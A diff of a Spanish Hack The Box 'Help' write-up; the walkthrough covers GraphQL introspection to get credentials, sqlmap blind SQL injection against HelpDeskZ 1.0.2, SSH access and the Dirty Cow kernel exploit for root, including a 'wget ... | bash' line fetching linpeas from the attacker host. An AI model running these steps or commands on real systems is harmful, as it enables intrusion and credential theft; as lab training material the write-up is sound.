@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Help - Hack The Box
-excerpt: "."
-date: 2026-04-04
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos de servicios, comenzamos con la página web activa en el puerto 80 y otra página web activa en el puerto 3000, pero en ambos casos no podemos encontrar algo relevante, por lo que aplicamos Fuzzing, descubriendo en la página web del puerto 80 el uso del sistema de tickets HelpDeskZ y en la del puerto 3000, enfocamos el Fuzzing para encontrar endpoints de una API, siendo que encontramos uno que pertenece a GraphQL. Sabiendo esto, aplicamos introspección y algunos filtros para poder obtener unas credenciales del endpoint de GraphQL. Dichas credenciales nos sirven para utilizar de forma autenticada el sistema HelpDeskZ, pudiendo así encontrar la versión de este, siendo la 1.0.2, que utilizamos para poder encontrar un Exploit acorde a esta versión. Encontramos un Exploit que aplica Blind SQL Injection para tratar de dumpear datos de la BD, pero al no funcionar, decidimos utilizar SQLMAP de forma agresiva para dumpear la BD, logrando obtener una contraseña que pertenece a un usuario de la máquina víctima. Probamos algunos usuarios y descubrimos un usuario válido que nos permite conectarnos a la máquina víctima vía SSH. Dentro, ejecutamos linpeas.sh para identificar alguna vulnerabilidad, descubriendo que la versión de Linux que usa la máquina víctima, es vulnerable a Dirty Cow. Utilizamos un Exploit de la BD de Exploit-DB que aplica el Dirty Cow, siendo así que escalamos privilegios y nos convertimos en Root."
+date: 2026-04-08
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-help/help.png
@@ -13,21 +13,43 @@ categories:
   - Easy
 tags:
   - Linux
+  - SSH
   - GraphQL
-  - 
+  - HelpDeskZ
+  - Web Enumeration
+  - Fuzzing
+  - API Fuzzing
+  - GraphQL Introspection
+  - BurpSuite
+  - Blind SQL Injection
+  - HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection
+  - Dirty Cow Exploit
+  - Privesc - Dirty Cow Exploit
   - OSCP Style
 ---
-![](/assets/images/htb-writeup-help/help.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-help/help.png" width="65%">
+</p>
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los escaneos de servicios, comenzamos con la página web activa en el **puerto 80** y otra página web activa en el **puerto 3000**, pero en ambos casos no podemos encontrar algo relevante, por lo que aplicamos **Fuzzing**, descubriendo en la página web del **puerto 80** el uso del sistema de tickets **HelpDeskZ** y en la del **puerto 3000**, enfocamos el **Fuzzing** para encontrar endpoints de una **API**, siendo que encontramos uno que pertenece a **GraphQL**. Sabiendo esto, aplicamos introspección y algunos filtros para poder obtener unas credenciales del endpoint de **GraphQL**. Dichas credenciales nos sirven para utilizar de forma autenticada el sistema **HelpDeskZ**, pudiendo así encontrar la versión de este, siendo la **1.0.2,** que utilizamos para poder encontrar un Exploit acorde a esta versión. Encontramos un Exploit que aplica **Blind SQL Injection** para tratar de dumpear datos de la BD, pero al no funcionar, decidimos utilizar **SQLMAP** de forma agresiva para dumpear la BD, logrando obtener una contraseña que pertenece a un usuario de la máquina víctima. Probamos algunos usuarios y descubrimos un usuario válido que nos permite conectarnos a la máquina víctima vía **SSH**. Dentro, ejecutamos linpeas.sh para identificar alguna vulnerabilidad, descubriendo que la versión de **Linux** que usa la máquina víctima, es vulnerable a **Dirty Cow**. Utilizamos un Exploit de la BD de **Exploit-DB** que aplica el **Dirty Cow**, siendo así que escalamos privilegios y nos convertimos en **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *ffuf*
+* *gobuster*
+* *BurpSuite*
+* *searchsploit*
+* *crackstation*
+* *sqlmap*
+* *ssh*
+* *linpeas.sh*
+* *wget*
+* *bash*
+* *scp*
+* *gcc*
+* *file*
 
 
 <br>
@@ -43,17 +65,25 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#Puerto3000">Analizando Página Web del Puerto 3000</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
+				<ul>
+					<li><a href="#fuzzHTTP">Aplicando Fuzzing a Página Web de Puerto 80</a></li>
+					<li><a href="#fuzzPuerto3000">Aplicando Fuzzing a Página Web de Puerto 3000 - Buscando Endpoints de APIs</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#Graphql">Aplicando Instrospección y Filtros para Obtener Credenciales en GraphQL</a></li>
+				<ul>
+					<li><a href="#Exploits">Identificando Exploits para HelpDeskZ</a></li>
+				</ul>
+				<li><a href="#HelpDeskZ2">Probando Exploit: HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#LinKernel">Abusando de Versión Vulnerable de Linux Kernel para Escalar Privilegios (Dirty Cow Exploit)</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -166,9 +196,9 @@ Nmap done: 1 IP address (1 host up) scanned in 15.18 seconds
 
 <br>
 
-Gracias al escaneo de serivicios, vemos bastante información útil:
-* El **puerto 22**, qué es el **servicio SSH**, muestra una versión vieja de **SSH** y que es vulnerable a un Exploit con el que puedes enumerar usuarios.
-* Al entrar en el **puerto 80**, nos redirigira al dominio `http://help.htb/`.
+Gracias al escaneo de servicios, vemos bastante información útil:
+* El **puerto 22**, que es el **servicio SSH**, muestra una versión vieja de **SSH** y que es vulnerable a un Exploit con el que puedes enumerar usuarios.
+* Al entrar en el **puerto 80**, nos redirigirá al dominio `http://help.htb/`.
 * El **puerto 3000** muestra el uso de **Node.js Express**, que ya se ha visto que es vulnerable a **Inyección de Comandos** y **SSRF**.
 
 Registremos el dominio en el `/etc/hosts`:
@@ -206,7 +236,7 @@ Veamos qué nos dice **Wappalizer**:
 
 Nos llama la atención el uso de **PHP**.
 
-No encontramos algo más en esta página, por lo que puede que se este utilizando para mostrar algún servicio que podríamos descubrir aplicando **Fuzzing**, pero lo haremos más adelante.
+No encontramos algo más en esta página, por lo que puede que se esté utilizando para mostrar algún servicio que podríamos descubrir aplicando **Fuzzing**, pero lo haremos más adelante.
 
 Vayamos a la página web del **puerto 3000**.
 
@@ -222,7 +252,7 @@ Entremos:
 
 Pareciera que entramos a una API, ya que la respuesta nos la da en formato **JSON**, que es común al consultar una **API**.
 
-Observa el mensaje que nos muestra, siendo que debemos dar la data correcta para obtener alguna contraseña, pero si tratamos de enviar algo nos dará un error.
+Observa el mensaje que nos muestra, siendo que debemos dar la data correcta para obtener alguna contraseña, pero si tratamos de enviar algo, nos dará un error.
 
 De momento no podremos ver más, así que lo más seguro es que podamos encontrar endpoints ocultos cuando apliquemos **Fuzzing** y debemos probarlos con tal de obtener las credenciales que se mencionan.
 
@@ -322,13 +352,13 @@ En ambos casos podemos ver 2 directorios, pero el que podremos ver será el de *
 <img src="/assets/images/htb-writeup-help/Captura4.png">
 </p>
 
-Parece ser un servicio para crear tickets de soporte técnico y para poder interactuar con esto, necesitamos credenciales válidas que de momento no tenemos.
+Parece ser un servicio para crear tickets de soporte técnico y, para poder interactuar con esto, necesitamos credenciales válidas que de momento no tenemos.
 
 <br>
 
 <h3 id="fuzzPuerto3000">Aplicando Fuzzing a Página Web de Puerto 3000 - Buscando Endpoints de APIs</h3>
 
-Algo importante cuando se aplica **Fuzzing** para encontrar **APIs**, es que estas funcionan en su mayoría con peticiónes **POST**.
+Algo importante cuando se aplica **Fuzzing** para encontrar **APIs** es que estas funcionan en su mayoría con peticiones **POST**.
 
 Primero probemos con **ffuf**:
 ```bash
@@ -401,9 +431,9 @@ Finished
 
 <br>
 
-En ambos casos, encontramos un endpoint llamado **graphql**, lo que nos indica que se esta utilizando **GraphQL** en esta página web.
+En ambos casos, encontramos un endpoint llamado **graphql**, lo que nos indica que se está utilizando **GraphQL** en esta página web.
 
-Y al visitarla, observa el mensaje qué nos da:
+Y al visitarla, observa el mensaje que nos da:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-help/Captura5.png">
@@ -431,7 +461,7 @@ Al identificar que se utiliza **GraphQL**, una de las técnicas que podemos apli
 
 <br>
 
-Aquí te dejo un par de blogs que mencionan como aplicar la **Introspección**:
+Aquí te dejo un par de blogs que mencionan cómo aplicar la **Introspección**:
 * <a href="https://graphql.org/learn/introspection/" target="_blank">GraphQL: Introspection</a>
 * <a href="https://portswigger.net/web-security/graphql#using-introspection" target="_blank">PortSwigger: GraphQL - Using Introspection</a>
 
@@ -452,13 +482,13 @@ Ahora, puede ocupar la siguiente query de **Introspección**:
 { "query": "{ __schema { types { name } } }" }
 ```
 
-O dandole clic derecho en la petición, veremos que aparece hasta arriba la opción **GraphQL**, que nos da una lista de opciones, siendo una de estas la de **Set introspection query**:
+O dándole clic derecho en la petición, veremos que aparece hasta arriba la opción **GraphQL**, que nos da una lista de opciones, siendo una de estas la de **Set introspection query**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-help/Captura8.png">
 </p>
 
-En mi caso ocupare la primera opción, ya que te da solamente las variables y no información extra, aunque también te sugiero que pruebas la opción de **BurpSuite** para ver el resultado.
+En mi caso, ocuparé la primera opción, ya que te da solamente las variables y no información extra, aunque también te sugiero que pruebes la opción de **BurpSuite** para ver el resultado.
 
 Observa las variables que podemos encontrar:
 
@@ -468,7 +498,7 @@ Observa las variables que podemos encontrar:
 
 Ahí podemos ver una variable llamada **User**.
 
-Vamos a consultarla con la siguiente query para poder ver cuales son sus campos:
+Vamos a consultarla con la siguiente query para poder ver cuáles son sus campos:
 ```bash
 { "query": "{ __type(name:\"User\") { name fields { name } } }" }
 ```
@@ -508,7 +538,7 @@ Busquemos una forma de explotar este servicio.
 
 <h3 id="Exploits">Identificando Exploits para HelpDeskZ</h3>
 
-Si buscamos un Exploit pata **HelpDeskZ**, encontraremos los siguientes:
+Si buscamos un Exploit para **HelpDeskZ**, encontraremos los siguientes:
 ```bash
 searchsploit helpdeskZ
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -521,13 +551,13 @@ Helpdeskz v2.0.2 - Stored XSS                                                   
 Shellcodes: No Results
 ```
 
-Tenemos 3 Exploits que podríamos usar, pero podemos descartar algunos si encontramos la versión que se esta usando de **HelpDeskZ**, siendo que podemos obtenerla al apuntar a la ruta `/readme.html`:
+Tenemos 3 Exploits que podríamos usar, pero podemos descartar algunos si encontramos la versión que se está usando de **HelpDeskZ**, siendo que podemos obtenerla al apuntar a la ruta `/readme.html`:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-help/Captura14.png">
 </p>
 
-Se esta usando la versión **1.0.2**.
+Se está usando la versión **1.0.2**.
 
 Ahora podemos utilizar/analizar estos dos Exploits para aplicarlos.
 
@@ -546,7 +576,7 @@ searchsploit -m php/webapps/41200.py
 File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (317)
 ```
 
-En el Exploit se nos deja un comentario de como funciona la **Inyección SQL** que resulta ser una **ciega/blind**:
+En el Exploit se nos deja un comentario de cómo funciona la **Inyección SQL** que resulta ser una **ciega/blind**:
 ```bash
 HelpDeskZ <= v1.0.2 suffers from an sql injection vulnerability that allow to retrieve administrator access data, and download unauthorized attachments.
 
@@ -605,7 +635,7 @@ Parameter: param[] (GET)
 ---
 [19:33:03] [INFO] the back-end DBMS is MySQL
 ```
-Excelente, ya pudimos identificar donde aplicar la inyección.
+Excelente, ya pudimos identificar dónde aplicar la inyección.
 
 Ahora vamos a dumpear la BD:
 ```bash
@@ -631,7 +661,7 @@ Table: staff
 ```
 Obtuvimos un usuario y contraseña que podemos probar en el **servicio SSH**.
 
-Si bien el usuario no es correcto, solo toma un poco de tiempo adivinar cual es el correcto:
+Si bien el usuario no es correcto, solo toma un poco de tiempo adivinar cuál es el correcto:
 ```bash
 ssh help@10.129.230.159
 help@10.129.230.159's password: 
@@ -661,10 +691,14 @@ help@help:~$ cat user.txt
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="LinKernel">Abusando de Versión Vulnerable de Linux Kernel para Escalar Privilegios (Dirty Cow Exploit)</h2>
 
+Dentro de la máquina, no encontraremos algún privilegio o algo que nos ayude a escalar privilegios, así que vamos a ejecutar **linpeas.sh**:
+* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>
+
+Una vez que lo descargues, puedes enviar el binario al **SSH** con **scp** o puedes ejecutarlo remotamente de la siguiente forma (para esto, primero debes levantar un servidor con **Python**):
 ```bash
-help@help:~$ wget -qO- http://10.10.14.191:8000/linpeas.sh | bash
+help@help:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
 ...
 ...
 ╔══════════╣ Operative system
@@ -675,7 +709,9 @@ Description:	Ubuntu 16.04.5 LTS
 Release:	16.04
 Codename:	xenial
 ```
+Al revisar el resultado, se recalca la versión del **Kernel de Linux**, pues parece ser vulnerable.
 
+Busquemos un Exploit para esa versión con **searchsploit**:
 ```bash
 searchsploit 'Linux Kernel 4.4.0-116 (Ubuntu 16.04.4)'
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -685,7 +721,17 @@ Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation          
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
 ```
+Excelente, tenemos un Exploit que nos va a permitir escalar privilegios.
 
+Investigando este Exploit, resulta que es la vulnerabilidad conocida como **Dirty Cow**:
+
+| **Dirty Cow Exploit** |
+|:---------------------:|
+| *Dirty COW es una vulnerabilidad de escalación de privilegios local en el Linux Kernel que permite a un usuario sin privilegios modificar archivos de solo lectura aprovechando una condición de carrera en el mecanismo de memoria llamado Copy-On-Write (COW).* |
+
+<br>
+
+Vamos a descargarlo:
 ```bash
 searchsploit -m linux/local/44298.c
   Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
@@ -696,6 +742,7 @@ searchsploit -m linux/local/44298.c
 File Type: C source, ASCII text
 ```
 
+Y lo mandamos al **SSH**, que puedes hacerlo con **scp**:
 ```bash
 scp 44298.c help@10.129.230.159:/home/help/
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
@@ -704,15 +751,19 @@ scp 44298.c help@10.129.230.159:/home/help/
 help@10.129.230.159's password: 
 44298.c
 ```
+Al ser este un script hecho en **lenguaje C**, primero necesitamos compilarlo y eso lo podemos hacer con el comando **gcc**, que curiosamente lo tiene la máquina víctima.
 
+Para compilarlo, solamente le damos el script a compilar y le damos un nombre con el parámetro `-o`:
 ```bash
-help@help:~$ gcc -o privesc 44298.c
+help@help:~$ gcc 44298.c -o privesc
 help@help:~$ ls
 44298.c  privesc  help  npm-debug.log  user.txt
 help@help:~$ file privesc
 privesc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a4e9208573e68938a4da70ca01d9581059138e8, not stripped
 ```
+Ya tenemos el binario compilado.
 
+Vamos a ejecutarlo:
 ```bash
 help@help:~$ ./privesc
 task_struct = ffff88003b8de200
@@ -721,7 +772,9 @@ spawning root shell
 root@help:~# whoami
 root
 ```
+Listo, ya somos **Root**.
 
+Obtengamos la última flag:
 ```bash
 root@help:~# cd /root
 root@help:/root# ls
@@ -729,7 +782,7 @@ root.txt  snap
 root@help:/root# cat root.txt
 ..
 ```
-
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -741,6 +794,9 @@ root@help:/root# cat root.txt
 
 * https://graphql.org/learn/introspection/
 * https://portswigger.net/web-security/graphql#using-introspection
+* https://github.com/peass-ng/PEASS-ng
+* https://www.exploit-db.com/exploits/44298
+* https://dirtycow.ninja/
 
 
 <br>
